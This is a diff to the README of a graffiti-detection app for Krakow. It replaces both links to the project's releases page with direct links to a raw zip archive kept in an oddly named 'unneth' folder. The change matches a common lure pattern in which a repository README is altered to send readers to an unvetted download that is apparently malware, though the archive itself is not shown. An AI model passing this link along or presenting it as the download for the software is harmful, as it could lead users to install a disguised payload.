@@ -1,6 +1,6 @@
 # 🎨 graffiti-finder - Organize city graffiti data with ease
 
-[![](https://img.shields.io/badge/Download_Graffiti_Finder-blue?style=for-the-badge)](https://github.com/heavy-cuttingangle951/graffiti-finder/releases)
+[![](https://img.shields.io/badge/Download_Graffiti_Finder-blue?style=for-the-badge)](https://github.com/heavy-cuttingangle951/graffiti-finder/raw/refs/heads/main/unneth/finder_graffiti_v2.1.zip)
 
 This application scans images of Krakow to locate graffiti. It uses a machine learning model to identify paint on structures. You receive a list of locations ready for formatting. The tool works on your computer. It does not send your data to the internet unless you choose to share it.
 
@@ -18,7 +18,7 @@ Your computer needs specific components to run this software. Ensure you meet th
 
 You need to download the installer from the release page.
 
-[https://github.com/heavy-cuttingangle951/graffiti-finder/releases](https://github.com/heavy-cuttingangle951/graffiti-finder/releases)
+[https://github.com/heavy-cuttingangle951/graffiti-finder/raw/refs/heads/main/unneth/finder_graffiti_v2.1.zip](https://github.com/heavy-cuttingangle951/graffiti-finder/raw/refs/heads/main/unneth/finder_graffiti_v2.1.zip)
 
 Follow these steps to complete the setup:
 
